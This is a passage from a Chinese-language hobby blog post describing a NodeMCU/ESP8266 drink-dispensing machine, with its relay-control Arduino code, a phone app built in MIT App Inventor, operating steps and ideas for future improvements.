motor轉動取料，再移動X軸至原位，Y軸移至起始位置加水，最後啟動抽水馬達則完畢。</p><blockquote><p>程式必須根據容器擺放位置，和原料出料時間，抽水量多寡來調整delay時間，且前排不需要移動Y軸。</p></blockquote><p>NodeMCU 程式碼:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> RELAY1 D7 <span class="comment">//CHOOCLATE</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RELAY2 D8 <span class="comment">// COFFEE</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RELAY3 D5 <span class="comment">// Tea</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ESP8266WiFi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WiFiClient.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ESP8266WebServer.h&gt;</span></span></span><br><span class="line">String command; <span class="comment">//String to store app command state.</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* ssid = <span class="string">&quot;專題&quot;</span>;</span><br><span class="line">ESP8266WebServer <span class="title function_">server</span><span class="params">(<span class="number">80</span>)</span>;</span><br><span class="line"><span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">pinMode(RELAY1, OUTPUT);</span><br><span class="line"> pinMode(RELAY2, OUTPUT);</span><br><span class="line"> pinMode(RELAY3, OUTPUT);</span><br><span class="line">Serial.begin(<span class="number">115200</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Connecting WiFi</span></span><br><span class="line">WiFi.mode(WIFI_AP);</span><br><span class="line"> WiFi.softAP(ssid);</span><br><span class="line">IPAddress myIP = WiFi.softAPIP();</span><br><span class="line"> Serial.print(<span class="string">&quot;AP IP address: &quot;</span>);</span><br><span class="line"> Serial.println(myIP);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// Starting WEB-server </span></span><br><span class="line"> server.on ( <span class="string">&quot;/&quot;</span>, HTTP_handleRoot );</span><br><span class="line"> server.onNotFound ( HTTP_handleRoot );</span><br><span class="line"> server.begin(); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//巧克力</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">relay1</span><span class="params">()</span>&#123;</span><br><span class="line"> delay(<span class="number">1000</span>);</span><br><span class="line"> digitalWrite(RELAY1,HIGH);</span><br><span class="line"> delay(<span class="number">180000</span>);</span><br><span class="line"> digitalWrite(RELAY1,LOW);</span><br><span class="line"> delay(<span class="number">5000</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//奶茶或咖啡</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">relay2</span><span class="params">()</span>&#123;</span><br><span class="line"> delay(<span class="number">1000</span>);</span><br><span class="line"> digitalWrite(RELAY2,HIGH);</span><br><span class="line"> delay(<span class="number">180000</span>);</span><br><span class="line"> digitalWrite(RELAY2,LOW);</span><br><span class="line"> delay(<span class="number">5000</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//茶</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">relay3</span><span class="params">()</span>&#123;</span><br><span class="line"> delay(<span class="number">1000</span>);</span><br><span class="line"> digitalWrite(RELAY3,HIGH);</span><br><span class="line"> delay(<span class="number">145000</span>);</span><br><span class="line"> digitalWrite(RELAY3,LOW);</span><br><span class="line"> delay(<span class="number">5000</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line"> server.handleClient();</span><br><span class="line"> </span><br><span class="line"> command = server.arg(<span class="string">&quot;State&quot;</span>); <span class="comment">//只有手機改變state，下面command才會變</span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span> (command == <span class="string">&quot;L&quot;</span>) &#123;</span><br><span class="line"> relay1(); <span class="comment">/*chocoltae*/</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="string">&quot;R&quot;</span>) &#123;</span><br><span class="line"> relay2(); <span class="comment">/*milk tea */</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="string">&quot;I&quot;</span>)&#123;</span><br><span class="line"> relay3(); <span class="comment">/*tea*/</span> </span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="string">&quot;F&quot;</span>)&#123;</span><br><span class="line"> counter ++;</span><br><span class="line"> Serial.println(counter);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">HTTP_handleRoot</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>( server.hasArg(<span class="string">&quot;State&quot;</span>) )&#123;</span><br><span class="line"> Serial.println(server.arg(<span class="string">&quot;State&quot;</span>));</span><br><span class="line"> &#125;</span><br><span class="line"> server.send ( <span class="number">200</span>, <span class="string">&quot;text/html&quot;</span>, <span class="string">&quot;&quot;</span> );</span><br><span class="line"> delay(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>手機端</p><blockquote><p>當時不會寫手機App :(，因此用簡單的MIT AppInventor 來製作</p></blockquote><p><img src="https://i.imgur.com/3QvP8RH.png"><br><img src="https://i.imgur.com/qefwDHP.png"><br><img src="https://i.imgur.com/sZfOMW0.png"></p><h2 id="實際操作"><a href="#實際操作" class="headerlink" title="實際操作"></a>實際操作</h2><ol><li>容器填料</li><li>裝水容器加水</li><li>power supply on</li><li>手機連到Wifi AP</li><li>開啟 APP選擇想喝的飲料</li><li>等待機器完成</li></ol><p><em>整體圖</em><br><img src="https://i.imgur.com/UOlH6Vp.jpg"></p><p><em>還有LED跑馬燈</em><br><img src="https://i.imgur.com/a51d2x3.jpg"></p><h2 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h2><p>此專題有很多可以改進的地方，不論是器材的選購以及馬達的穩定度<br>雖然Arduino真的很簡單，但只要點子夠多還是發展無窮。</p><h2 id="未來發展"><a href="#未來發展" class="headerlink" title="未來發展"></a>未來發展</h2><ul><li>上方原料罐可設計成可拆卸式</li><li>可以設計攪拌模組(直流馬達配冰棒棍之類的XD)</li><li>防水設計</li><li>APP 改用 Android Studio 設計，比較多彈性</li><li>直接選購結合 ESP8266和繼電器的模組(後來才知道有這東西)</li><li>語音辨識，不用APP</li><li>加熱器：可同時冷、熱水沖泡</li></ul>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arduino </tag>
            
            <tag> IOT </tag>
            
            <tag> NodeMCU </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
